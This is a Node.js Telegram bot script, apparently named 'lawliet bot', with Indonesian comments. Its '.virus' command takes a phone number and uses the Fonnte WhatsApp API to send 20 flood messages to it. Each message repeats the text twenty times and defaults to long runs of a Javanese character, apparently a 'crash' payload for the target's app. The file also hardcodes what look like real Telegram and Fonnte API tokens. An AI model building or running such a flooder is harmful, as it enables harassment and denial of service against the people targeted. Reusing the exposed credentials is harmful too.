// l.js — Telegram + Fonnte bot (v4 fix)
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'ctKBo8JdYJ3XqxPBD6Fg';

if (!TELEGRAM_TOKEN || !FONNTE_KEY) {
  console.error('Set TELEGRAM_TOKEN & FONNTE_KEY');
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const make20 = txt => Array.from({ length: 20 }).map(() => txt).join('\n');
const sleep = ms => new Promise(r => setTimeout(r, ms));

/**
 * Kirim foto dengan path absolut agar aman di semua environment (Termux, Linux, dll)
 */
async function safeSendPhoto(chatId, filePath, options = {}) {
  try {
    const absPath = path.resolve(filePath); // ubah ke path absolut
    if (!fs.existsSync(absPath)) {
      console.error('❌ File tidak ditemukan di:', absPath);
      return bot.sendMessage(chatId, `Foto ${path.basename(filePath)} tidak ditemukan!`);
    }
    console.log('📸 Mengirim foto dari:', absPath);
    return bot.sendPhoto(chatId, { source: absPath }, options);
  } catch (err) {
    console.error('⚠️ safeSendPhoto error:', err.message);
    return bot.sendMessage(chatId, '❌ Gagal membaca file foto.');
  }
}

// === Handler pesan masuk ===
bot.on('message', async msg => {
  try {
    const chatId = msg.chat.id;
    const t = (msg.text || '').trim();

    // ===== .menu =====
    if (t === '.menu') {
      await safeSendPhoto(chatId, './nina.jpg', {
        caption: `こんにちは、お母さん。リファットが作ったlawliet\n\nDEV:@rifat\nNama bot: lawliet bot\nV: v2`,
        reply_markup: {
          inline_keyboard: [
            [{ text: 'MENU BOT', callback_data: 'open_menu' }]
          ]
        }
      });
      return;
    }

    // ===== .virus =====
    if (!t.startsWith('.virus')) return;

    const parts = t.split(/\s+/);
    const target = parts[1];
    const text = parts.slice(2).join(' ') || 'ꦾ'.repeat(100);
    if (!target) return bot.sendMessage(chatId, 'Format: .virus 62812xxxx [isi]');

    const payloadText = make20(text);
    let successCount = 0;

    for (let i = 1; i <= 20; i++) {
      try {
        await axios.post('https://api.fonnte.com/send',
          { target: target.trim(), message: payloadText },
          { headers: { Authorization: FONNTE_KEY }, timeout: 20000 }
        );
        successCount++;
        await bot.sendMessage(chatId, `${i} pesan terkirim`);
      } catch (e) {
        await bot.sendMessage(chatId, `Pesan ke-${i} gagal dikirim`);
      }
      await sleep(1000);
    }

    await bot.sendMessage(chatId, `✅ Selesai. ${successCount}/20 pesan berhasil dikirim.`);
  } catch (e) {
    console.error('Message handler error:', e?.response?.data || e.message);
    try { await bot.sendMessage(msg.chat.id, '❌ Gagal. Cek API key / koneksi.'); } catch (_) {}
  }
});

// === Handler tombol callback (MENU BOT) ===
bot.on('callback_query', async query => {
  try {
    await bot.answerCallbackQuery(query.id, { text: 'Memproses...' }).catch(() => {});
  } catch (_) {}

  const chatId = query.message?.chat?.id;
  const data = query.data;

  try {
    if (data === 'open_menu') {
      await safeSendPhoto(chatId, './nina.jpg', {
        caption: `番号を入力して直接送信\n\nDEV:RIFAT\nV:v1\n\n送信 .virus 62××××××\nまだ受け入れる`
      });
    }
  } catch (e) {
    console.error('Callback processing error:', e?.message || e);
  }
});

// Tangkap error polling global biar gak crash
bot.on('polling_error', (err) => {
  console.error('Polling error:', err?.response?.body || err.message || err);
});
